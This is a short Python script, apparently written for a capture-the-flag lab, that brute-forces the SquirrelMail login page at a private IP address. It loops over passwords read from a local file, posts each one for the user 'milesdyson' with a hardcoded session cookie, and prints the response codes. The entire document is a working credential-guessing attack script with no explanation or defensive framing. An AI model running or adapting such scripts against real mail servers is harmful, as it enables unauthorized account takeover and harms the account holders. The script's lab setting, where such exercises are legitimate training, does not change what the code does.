import requests

url = 'http://10.10.151.198/squirrelmail/src/redirect.php'

coockie = {"SQMSESSID": "fcqo85obj4r6jfsj68tafaqh05", "squirrelmail_language": "en_US"}

with open("log1.txt", 'r') as passwords:
    for passwd in passwords.readlines():
        print(passwd.strip())
        user = "milesdyson"
        data = {
            'login_username': user,
            'secretkey': passwd.strip(),
            'js_autodetect_results': '1',
            'just_logged_in': '1'
        }
        r = requests.post(url, data=data, cookies=coockie, allow_redirects=True)
        print(f"User {user} and Password {passwd.strip()}: {r.status_code}")

